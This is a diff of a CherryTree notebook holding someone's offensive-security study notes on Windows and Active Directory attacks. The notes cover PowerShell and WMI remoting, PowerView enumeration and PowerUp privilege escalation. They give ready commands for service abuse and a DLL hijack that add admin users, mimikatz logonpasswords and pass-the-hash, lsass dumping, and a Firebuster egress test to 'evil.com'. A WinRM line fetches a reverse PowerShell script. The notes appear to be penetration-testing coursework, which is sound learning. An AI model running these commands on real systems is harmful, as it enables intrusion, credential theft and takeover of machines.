@@ -109,7 +109,7 @@ To list all the functions in a powershell script convert .ps1 to .psm1 and then 
 Get-Command -Module _modulename_
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="True" name="Remoting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592008887.23" ts_lastsave="1593947966.41" unique_id="3">
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Remoting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592008887.23" ts_lastsave="1596382509.73" unique_id="3">
 			<rich_text>
 
 </rich_text>
@@ -134,26 +134,26 @@ Get-Command -Module _modulename_
 • Invoke-Command -ScriptBlock {$env:Computer-Name} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo
 • Invoke-Command -ScriptBlock {Get-Process} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo
 • Get-Help New-PSSession
-• New-PSSsession -ComputerName  PRVDXB113 -Credential provise\sahil.tikoo → creates new session with remote machine
-• Get-PSSession 
+• New-PSSsession -ComputerName  PRVDXB113 -Credential provise\sahil.tikoo → creates new session with remote machine // gives the ID of session //
+• Get-PSSession // to get session details //
 • $PSVersionTable → Get powershell version for current session
-• Enter-PSSsession -Id 1 → now enter any commands on remote machine just like after ssh 
+• Enter-PSSession -Id 1 → now enter any commands on remote machine just like after ssh 
 • Enable-PSremoting -Force → on remote victim machine if windows server less than 2012 
 • Invoke-Command -ScriptBlock -Filepath C:\test.ps1 -ComputerName PRVDXB113 -Credential provise\sahil.tikoo
 • Import-Module .\test.psm1 ;Invoke-Command -ScriptBlock ${function:Function-name} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo → To execute functions in module on remote machine
-• Invoke-Command works stateless , so to maintain a link between multiple Invoke commands , first do New-PSSession then specify -Session $sess=Get-PSSession 
+• Invoke-Command works stateless , so to maintain a link between multiple Invoke commands , first do $sess=New-PSSsession -ComputerName  PRVDXB113  then specify   $sess with the invoke commands using -Session $sess 
 • Export-PSSession → to export all the functions and scripts ran on remote machine
 
 
 </rich_text>
-			<rich_text foreground="#ffffa5a50000" weight="heavy">Double Hop Problem </rich_text>
-			<rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Double Hop Problem</rich_text>
+			<rich_text>(constrained delegation)
 
 Target1-&gt; attacker's machine Target2-&gt; Remote machine Target3-&gt; Domain controller
 
 If u are trying to access data in Target3 from Target1 then you need to first use New-PSSession to hop onto target2 from target1 and then use the command : Enable-WSManCredSSP  -Role Server 
 
-Now you can access lets say DC using ls \\DC\sysvol through target3 if u were a domain admin.
+Now you can access lets say DC using ls \\DC\sysvol through target3 if u were a domain admin using target2 server 
 
 </rich_text>
 			<rich_text foreground="#ffffa5a50000" weight="heavy">Jobs</rich_text>
@@ -163,7 +163,7 @@ Now you can access lets say DC using ls \\DC\sysvol through target3 if u were a 
 • Start-Job -Scriptblock {hostname}  → assigned ID 5 
 • Get-job -Id 5
 • Get-job -Id 5 |Receive-Job → output of Job 
-• If executing jobs on remote machine using Invoke-Command make sure to use -Session $sess ; where $sess=Get-PSSession 
+• If executing jobs on remote machine using Invoke-Command make sure to use -Session $sess ; where $sess=New-PSSession 
 
 
 </rich_text>
@@ -277,7 +277,7 @@ $Symlink= Add-Type -MemberDefinition $signature -Name symlink -Namespace createl
 </rich_text>
 			</node>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="True" name="WMI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592596234.71" ts_lastsave="1592728021.21" unique_id="6">
+		<node custom_icon_id="0" foreground="" is_bold="True" name="WMI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592596234.71" ts_lastsave="1594744181.93" unique_id="6">
 			<rich_text>
 
 </rich_text>
@@ -295,7 +295,7 @@ $Symlink= Add-Type -MemberDefinition $signature -Name symlink -Namespace createl
 			<rich_text foreground="#ffffa5a50000" weight="heavy">WMI REMOTING </rich_text>
 			<rich_text>
 
-Advantage of using wmi is that we don't need powershell remoting to be enabled on remote machine 
+Advantage of using wmi is that we don't need powershell remoting to be enabled on remote machine but for running wmi you need local admin privileges on the foothold machine 
 
 • Get-WmiObject  -Class Win32_process -ComputerName PRVDXB113 -Credential provise\sahil.tikoo // similar to  Invoke-Command -ScriptBlock {Get-Process} -ComputerName PRVDXB113 -Credential provise\sahil.tikoo // 
 • Attributes in Wmi-Object cmdlet : -filter (Name= “ name_of_process”) , -Query (Select * from Win32_process where Name = “name_of_process”)
@@ -681,7 +681,7 @@ Example → add the ruby script in /opt/metasploit/modules/exploits/windows/smb/
 </rich_text>
 			</node>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="True" name="Domain Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593462532.03" ts_lastsave="1593780144.33" unique_id="20">
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Domain Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593462532.03" ts_lastsave="1599462501.89" unique_id="20">
 			<rich_text>
 
 
@@ -707,7 +707,7 @@ PowerView from powertools //recently moved to powersploit //
 • Invoke-UserHunter //Find computers where a domain admin is logged in//
 • Invoke-ShareFinder //Find shares on hosts in current domain//
 • Invoke-FileFinder //Find sensitive files on computers in the domain//
-• FindLocalAdminAccess //Find all machines on the current domain where the current user has local admin access // 
+• Find-LocalAdminAccess //Find all machines on the current domain where the current user has local admin access //
 • Invoke-HostEnum –Hostname domainpc //Run all enumeration on a particular computer//
 • Invoke-EnumerateLocalAdmin //Find local admins on all machines of the domain//
 
@@ -744,12 +744,12 @@ Invoke-Decode -EncodedData **paste the data received on web server ** → pass t
 
 • Egress Traffic are connections that are initiated from within an organsiation / system to an external Internet host.
 • For egress testing we have . .\nishang\Gather\Firelistener.ps1 
-• FireListener -PortRange 100-200  //Starts listening on these ports  on attacker's machine//
+• FireListener -PortRange 100-200  //Starts listening on these ports on attacker's machine//
 • . .\nishang\Gather\Firebuster.ps1 \\run it on victim machine \\
 •  Firebuster -targetip evil.com -PortRange 100-200 \\ connects to the attackers ports if allowed //
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="True" name="Privilege Escalation " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593780207.86" ts_lastsave="1594011891.22" unique_id="21">
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Privilege Escalation " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593780207.86" ts_lastsave="1599462612.29" unique_id="21">
 			<rich_text>
 
 
@@ -768,13 +768,14 @@ Get-Command -Module powerup
 • </rich_text>
 			<rich_text link="webs https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/">https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/</rich_text>
 			<rich_text>
-• Invoke-ServiceAbuse -ServiceName ETDService -UserName viper -Password abc1234//Modify an unquoted service to add administrative user. //
+• Invoke-ServiceAbuse -ServiceName ETDService -UserName viper -Password abc1234//It abuses the service permission wherein we point the service to cmd or any executable not necessarily in the service path to add administrative user. //
 • Once you run the above command a user named “viper” with admin privileges will be created // net user viper → to check if created //
 • Run →  runas /user:viper cmd.exe  on a low privileged cmd shell and a new cmd shell will pop up with viper's admin privileges.
+• if the above command doesn't work sometimes you can use :  Invoke-ServiceAbuse -Name ETDService // this will create a default account john with admin priv //
 
 • Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! //  Creates a new binary and backs up the actual service binary //
 • Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! // Make changes(adds shellcode or c# code ) in the same binary , doesn't create a new binary //
-• Sometimes services need to be stopped and restarted again to execute the above attacks using → **Invoke-ServiceStop** , **Invoke-ServiceStart** 
+• Sometimes services need to be stopped and restarted again to execute the above attacks using → **Start-Service** , **Stop-Service** 
 
 
 For running all tests run → Invoke-allchecks 
@@ -796,7 +797,7 @@ For running all tests run → Invoke-allchecks
 			<rich_text>
 
 
-• Find-DLLHijack // D:\CherryTree\bin\cherrytree.exe                                            sahil.tikoo D:\CherryTree\bin\ntdll.dll  → This was one dll identified which could be used for hijacking in my machine //
+• Find-DLLHijack // D:\CherryTree\bin\ntdll.dll  → This was one dll identified which could be used for hijacking in my machine //
 • Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles -ExcludeOwned // to exclude some system services and processes  and list processes with SYSTEM ownership//
 • Find-PathHijack | fl * // Get path of the all the services/processess where a dll can be implanted to gain higher privileges //
 •  Write-HijackDll -OutputFile 'D:\CherryTree\bin\\ntdll.dll' -Command 'net user tikoo 123456 /add' → This cmdlet is used to add a missing dll in cherry tree folder which was found to be writeable and when cherry tree is restarted this malicious dll executes creating a new user with SYSTEM privileges //
@@ -836,7 +837,7 @@ Get-process lsass | Invoke-TokenManipulation -ImpersonateUser // we can imperson
 
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="True" name="Dump System Secrets" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593806022.19" ts_lastsave="1594023456.47" unique_id="22">
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Dump System Secrets" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593806022.19" ts_lastsave="1595580889.75" unique_id="22">
 			<rich_text>
 
 
@@ -847,10 +848,10 @@ Get-process lsass | Invoke-TokenManipulation -ImpersonateUser // we can imperson
 • mimikatz # privilege::debug
 • mimikatz # sekurlsa::logonpasswords
 • sekurlsa::pth /user:Administrator /domain:provise /ntlm:{hash value}  // pass the hash //
-• PsExec.exe \\provise cmd.exe //sometimes the cmd opened using pth technique above wont show the actual user through whoami so use PSExec.exe //
+• PsExec.exe \\provise cmd.exe or you can specify /run:powershell.exe above in sekurlsa 
 
 
-• procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp // we can use procdump tool from sysinternals to dump hashes //
+• procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp // we can use procdump tool from sysinternals to dump hashes // → else you can right click on lsaas process in task manager and dump from there
 • Now we will load this lsass.dmp in mimikatz to extract credentials using minidump functionality of SEKURLSA module.
 • sekurlsa::minidump lsass.dmp
 
@@ -896,7 +897,7 @@ Replaying credentials:
 • Credential reuse // After dumping credentials from different machines , sometimes the same password work across different machine for other users as well //
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="True" name="Remoting Revisited " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593941425.08" ts_lastsave="1594065429.57" unique_id="25">
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Remoting Revisited " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593941425.08" ts_lastsave="1594917312.85" unique_id="25">
 			<rich_text>
 
 
@@ -909,7 +910,7 @@ WinRM/WSMAN Command Execution:
 			<rich_text> 1/reverse_powershell.ps1'))&quot;} -ComputerName domainpc –Credential domainpc/domain 
 
 
-WSMAN is firewall friendly as compared to powershell remoting and WMI and it can also be used to run commands on non windows boxes as well.
+WSMAN is firewall friendly as compared to WMI and it can also be used to run commands on non windows boxes as well.
 
 </rich_text>
 		</node>
